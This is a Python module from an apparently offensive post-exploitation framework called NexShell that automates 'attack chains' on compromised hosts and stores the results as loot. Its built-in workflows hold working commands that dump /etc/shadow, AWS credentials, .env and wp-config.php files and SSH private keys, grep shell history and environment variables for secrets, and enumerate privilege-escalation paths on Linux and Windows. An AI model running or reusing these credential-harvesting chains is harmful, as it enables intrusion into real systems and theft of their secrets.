#!/usr/bin/env python3
"""
NexShell — Workflow Engine  (core/workflow.py)
Automated multi-step attack chains: define steps, execute sequentially,
collect results at each stage.

Usage:
    from core.workflow import Workflow, Step

    wf = Workflow("privesc-linux")
    wf.add_step("whoami",      cmd="id",                   expect_root=False)
    wf.add_step("sudo-check",  cmd="sudo -l",              depends=["whoami"])
    wf.add_step("suid-search", cmd="find / -perm -4000 2>/dev/null", depends=["whoami"])
    wf.run(session)

CLI:
    workflow list
    workflow run linux-privesc
    workflow status <id>
"""

import uuid
import json
import datetime
import threading
import logging
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger('nexshell.workflow')


# ══════════════════════════════════════════════════════════════════════════════
#  STEP
# ══════════════════════════════════════════════════════════════════════════════

class Step:
    """A single step in a workflow."""

    PENDING   = 'pending'
    RUNNING   = 'running'
    COMPLETED = 'completed'
    FAILED    = 'failed'
    SKIPPED   = 'skipped'

    def __init__(self, name: str, cmd: str = "", fn: Callable = None,
                 depends: List[str] = None, timeout: int = 30,
                 expect_root: bool = False, on_success: Callable = None,
                 on_failure: Callable = None, save_loot: bool = False,
                 loot_category: str = "custom", description: str = ""):
        self.id           = str(uuid.uuid4())[:8]
        self.name         = name
        self.cmd          = cmd        # Shell command to run on session
        self.fn           = fn         # Python callable (overrides cmd)
        self.depends      = depends or []
        self.timeout      = timeout
        self.expect_root  = expect_root
        self.on_success   = on_success
        self.on_failure   = on_failure
        self.save_loot    = save_loot
        self.loot_category= loot_category
        self.description  = description
        self.status       = self.PENDING
        self.output       = ""
        self.error        = ""
        self.started_at   = None
        self.finished_at  = None

    def to_dict(self) -> dict:
        return {
            'id': self.id, 'name': self.name, 'cmd': self.cmd,
            'status': self.status, 'output_preview': self.output[:200],
            'error': self.error, 'started_at': self.started_at,
            'finished_at': self.finished_at,
        }


# ══════════════════════════════════════════════════════════════════════════════
#  WORKFLOW
# ══════════════════════════════════════════════════════════════════════════════

class Workflow:
    """
    Sequential multi-step workflow with dependency resolution.
    Each step can execute a shell command or a Python callable on a session.
    """

    PENDING   = 'pending'
    RUNNING   = 'running'
    COMPLETED = 'completed'
    FAILED    = 'failed'
    ABORTED   = 'aborted'

    def __init__(self, name: str, description: str = "",
                 stop_on_failure: bool = False):
        self.id              = str(uuid.uuid4())[:8]
        self.name            = name
        self.description     = description
        self.stop_on_failure = stop_on_failure
        self.steps:  List[Step] = []
        self.status  = self.PENDING
        self._thread: Optional[threading.Thread] = None
        self.started_at  = None
        self.finished_at = None

    def add_step(self, name: str, cmd: str = "", fn: Callable = None,
                 depends: List[str] = None, timeout: int = 30,
                 save_loot: bool = False, loot_category: str = "custom",
                 description: str = "") -> 'Workflow':
        """Add a step. Returns self for chaining."""
        step = Step(name=name, cmd=cmd, fn=fn, depends=depends or [],
                    timeout=timeout, save_loot=save_loot,
                    loot_category=loot_category, description=description)
        self.steps.append(step)
        return self

    def run(self, session, background: bool = True) -> str:
        """Execute the workflow. Returns workflow ID."""
        if background:
            self._thread = threading.Thread(
                target=self._execute, args=(session,),
                daemon=True, name=f'nxsh-wf-{self.name}'
            )
            self._thread.start()
        else:
            self._execute(session)
        return self.id

    def _execute(self, session):
        self.status     = self.RUNNING
        self.started_at = datetime.datetime.utcnow().isoformat()
        logger.info(f"Workflow '{self.name}' started [{self.id}]")

        completed_names = set()

        for step in self.steps:
            # Check dependencies
            missing = [d for d in step.depends if d not in completed_names]
            if missing:
                # Check if any dependency failed
                dep_failed = any(
                    s.status == Step.FAILED
                    for s in self.steps
                    if s.name in step.depends
                )
                if dep_failed:
                    step.status = Step.SKIPPED
                    logger.info(f"  Step '{step.name}' skipped (dependency failed)")
                    continue

            step.status     = Step.RUNNING
            step.started_at = datetime.datetime.utcnow().isoformat()
            logger.info(f"  Step '{step.name}' running...")

            try:
                if step.fn:
                    step.output = str(step.fn(session) or '')
                elif step.cmd and session:
                    step.output = self._run_cmd(session, step.cmd, step.timeout)
                else:
                    step.output = ""

                step.status = Step.COMPLETED
                completed_names.add(step.name)

                # Save loot if requested
                if step.save_loot and step.output:
                    try:
                        from db import get_db
                        db = get_db()
                        host = getattr(session, 'host', '')
                        sid  = getattr(session, 'id',   0)
                        db.add_loot(
                            session_id=sid, host=host,
                            category=step.loot_category,
                            source=f"workflow:{self.name}:{step.name}",
                            data=step.output,
                        )
                    except Exception:
                        pass

                logger.info(f"  Step '{step.name}' ✅ completed")
                if step.on_success:
                    step.on_success(step.output)

            except Exception as e:
                step.status = Step.FAILED
                step.error  = str(e)
                logger.warning(f"  Step '{step.name}' ❌ failed: {e}")
                if step.on_failure:
                    step.on_failure(e)
                if self.stop_on_failure:
                    self.status     = self.FAILED
                    self.finished_at= datetime.datetime.utcnow().isoformat()
                    logger.warning(f"Workflow '{self.name}' aborted on failure")
                    return

            step.finished_at = datetime.datetime.utcnow().isoformat()

        any_failed = any(s.status == Step.FAILED for s in self.steps)
        self.status      = self.FAILED if any_failed else self.COMPLETED
        self.finished_at = datetime.datetime.utcnow().isoformat()
        logger.info(f"Workflow '{self.name}' finished: {self.status}")

        # Emit event
        try:
            from core.event_bus import bus
            bus.emit(f'workflow.{self.status}', workflow=self.name, wf_id=self.id)
        except Exception:
            pass

    def _run_cmd(self, session, cmd: str, timeout: int) -> str:
        """Execute a command on the session."""
        if hasattr(session, 'exec'):
            return session.exec(cmd) or ''
        if hasattr(session, 'run'):
            return session.run(cmd, timeout=timeout) or ''
        return ''

    def status_report(self) -> str:
        lines = [
            f"\n  Workflow: {self.name} [{self.id}] — {self.status}",
        ]
        for step in self.steps:
            icon = {'completed': '✅', 'failed': '❌', 'running': '🔄',
                    'pending': '⏳', 'skipped': '⏭️'}.get(step.status, '?')
            lines.append(f"    {icon} {step.name:<30} {step.status}")
            if step.error:
                lines.append(f"       Error: {step.error[:80]}")
        lines.append("")
        return '\n'.join(lines)

    def to_dict(self) -> dict:
        return {
            'id': self.id, 'name': self.name,
            'status': self.status, 'steps': [s.to_dict() for s in self.steps],
            'started_at': self.started_at, 'finished_at': self.finished_at,
        }


# ══════════════════════════════════════════════════════════════════════════════
#  WORKFLOW LIBRARY — Built-in workflows
# ══════════════════════════════════════════════════════════════════════════════

def _build_linux_privesc() -> Workflow:
    wf = Workflow("linux-privesc", "Automated Linux privilege escalation enumeration")
    wf.add_step("whoami",       cmd="id && whoami",           description="Check current user")
    wf.add_step("sudo-l",       cmd="sudo -l 2>/dev/null",    description="List sudo rights", save_loot=True, loot_category="credentials")
    wf.add_step("suid",         cmd="find / -perm -4000 -o -perm -2000 2>/dev/null | head -30", description="Find SUID/GUID binaries", save_loot=True, loot_category="privesc")
    wf.add_step("cron",         cmd="cat /etc/cron* /var/spool/cron/* 2>/dev/null", description="Check cron jobs", save_loot=True, loot_category="privesc")
    wf.add_step("capabilities", cmd="getcap -r / 2>/dev/null",  description="Check capabilities")
    wf.add_step("passwd-hash",  cmd="cat /etc/passwd && cat /etc/shadow 2>/dev/null", description="Read /etc/passwd", save_loot=True, loot_category="hashes")
    wf.add_step("env-vars",     cmd="env | grep -iE 'pass|key|secret|token' 2>/dev/null", description="Check env for secrets", save_loot=True, loot_category="credentials")
    wf.add_step("writable-paths", cmd="find / -writable -type f 2>/dev/null | grep -v '/proc\\|/sys' | head -20", description="Find writable files")
    wf.add_step("kernel",       cmd="uname -a",               description="Check kernel version", save_loot=True, loot_category="custom")
    return wf


def _build_cred_hunt() -> Workflow:
    wf = Workflow("cred-hunt", "Automated credential hunting across the filesystem")
    wf.add_step("env-secrets",  cmd="env | grep -iE 'pass|key|secret|token|api'",       save_loot=True, loot_category="credentials", description="Check environment")
    wf.add_step("bash-history", cmd="cat ~/.bash_history 2>/dev/null | grep -iE 'pass|ssh|curl|wget'", save_loot=True, loot_category="credentials", description="Check bash history")
    wf.add_step("ssh-keys",     cmd="find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | head -10", save_loot=True, loot_category="private_keys", description="Find SSH keys")
    wf.add_step("aws-creds",    cmd="cat ~/.aws/credentials 2>/dev/null",                save_loot=True, loot_category="api_tokens",   description="Check AWS credentials")
    wf.add_step("env-files",    cmd="find / -name '.env' -not -path '*/proc/*' 2>/dev/null | head -5 | xargs cat 2>/dev/null", save_loot=True, loot_category="credentials", description="Find .env files")
    wf.add_step("config-files", cmd="find /var/www /opt /home /srv -name 'config.*' -o -name 'settings.*' -o -name 'database.*' 2>/dev/null | head -5 | xargs cat 2>/dev/null", save_loot=True, loot_category="credentials", description="Check config files")
    wf.add_step("wp-config",    cmd="find / -name 'wp-config.php' 2>/dev/null | head -3 | xargs cat 2>/dev/null", save_loot=True, loot_category="credentials", description="WordPress config")
    wf.add_step("shadow",       cmd="cat /etc/shadow 2>/dev/null",                       save_loot=True, loot_category="hashes",       description="Read shadow file")
    return wf


def _build_quick_recon() -> Workflow:
    wf = Workflow("quick-recon", "Fast initial post-exploitation reconnaissance")
    wf.add_step("id",           cmd="id && whoami",                                      description="Current user")
    wf.add_step("hostname",     cmd="hostname -f 2>/dev/null || hostname",               description="Hostname")
    wf.add_step("os-info",      cmd="cat /etc/os-release 2>/dev/null || uname -a",      description="OS info",  save_loot=True, loot_category="custom")
    wf.add_step("network",      cmd="ip addr 2>/dev/null || ifconfig 2>/dev/null",       description="Network interfaces", save_loot=True, loot_category="network")
    wf.add_step("routes",       cmd="ip route 2>/dev/null || netstat -rn 2>/dev/null",   description="Routing table",     save_loot=True, loot_category="network")
    wf.add_step("listening",    cmd="ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", description="Listening ports",   save_loot=True, loot_category="network")
    wf.add_step("processes",    cmd="ps aux 2>/dev/null | head -30",                     description="Running processes")
    wf.add_step("users",        cmd="cat /etc/passwd | grep -v nologin | grep -v false", description="Valid users",        save_loot=True, loot_category="credentials")
    wf.add_step("groups",       cmd="id && cat /etc/group 2>/dev/null",                  description="Groups")
    wf.add_step("mounts",       cmd="mount | grep -v 'sysfs\\|proc\\|cgroup\\|tmpfs' | head -20", description="Mounted filesystems", save_loot=True, loot_category="network")
    return wf


def _build_windows_recon() -> Workflow:
    wf = Workflow("windows-recon", "Windows initial reconnaissance after shell access")
    wf.add_step("whoami",       cmd="whoami /all",              description="Current user + groups", save_loot=True, loot_category="credentials")
    wf.add_step("system-info",  cmd="systeminfo",               description="System info",           save_loot=True, loot_category="custom")
    wf.add_step("network",      cmd="ipconfig /all",            description="Network config",        save_loot=True, loot_category="network")
    wf.add_step("netstat",      cmd="netstat -ano",             description="Listening ports",        save_loot=True, loot_category="network")
    wf.add_step("users",        cmd="net user",                 description="Local users",            save_loot=True, loot_category="credentials")
    wf.add_step("admins",       cmd="net localgroup administrators", description="Local admins",      save_loot=True, loot_category="credentials")
    wf.add_step("tasks",        cmd="schtasks /query /fo LIST /v", description="Scheduled tasks")
    wf.add_step("services",     cmd="sc query type= all state= all", description="Services")
    wf.add_step("creds-stored", cmd="cmdkey /list",             description="Stored credentials",    save_loot=True, loot_category="credentials")
    wf.add_step("firewall",     cmd="netsh advfirewall show currentprofile", description="Firewall status")
    return wf


# ══════════════════════════════════════════════════════════════════════════════
#  WORKFLOW MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class WorkflowManager:
    """Registry and runner for workflows."""

    def __init__(self):
        self._library:  Dict[str, Callable[[], Workflow]] = {}
        self._history:  List[Workflow]                    = []
        self._load_builtins()

    def _load_builtins(self):
        self._library = {
            'linux-privesc':  _build_linux_privesc,
            'cred-hunt':      _build_cred_hunt,
            'quick-recon':    _build_quick_recon,
            'windows-recon':  _build_windows_recon,
        }

    def register(self, name: str, builder: Callable[[], Workflow]):
        """Register a custom workflow builder function."""
        self._library[name] = builder

    def list_all(self) -> List[Dict]:
        results = []
        for name, builder in self._library.items():
            wf = builder()
            results.append({
                'name':        name,
                'description': wf.description,
                'steps':       len(wf.steps),
            })
        return results

    def run(self, name: str, session, background: bool = True) -> Optional[Workflow]:
        """Instantiate and run a workflow by name."""
        builder = self._library.get(name)
        if not builder:
            logger.error(f"Workflow '{name}' not found")
            return None
        wf = builder()
        self._history.append(wf)
        wf.run(session, background=background)
        logger.info(f"Workflow '{name}' launched [{wf.id}] (background={background})")
        return wf

    def get_history(self) -> List[Dict]:
        return [wf.to_dict() for wf in self._history[-20:]]

    def get_by_id(self, wf_id: str) -> Optional[Workflow]:
        return next((wf for wf in self._history if wf.id == wf_id), None)


# ══════════════════════════════════════════════════════════════════════════════
#  GLOBAL SINGLETON
# ══════════════════════════════════════════════════════════════════════════════

wf_manager = WorkflowManager()
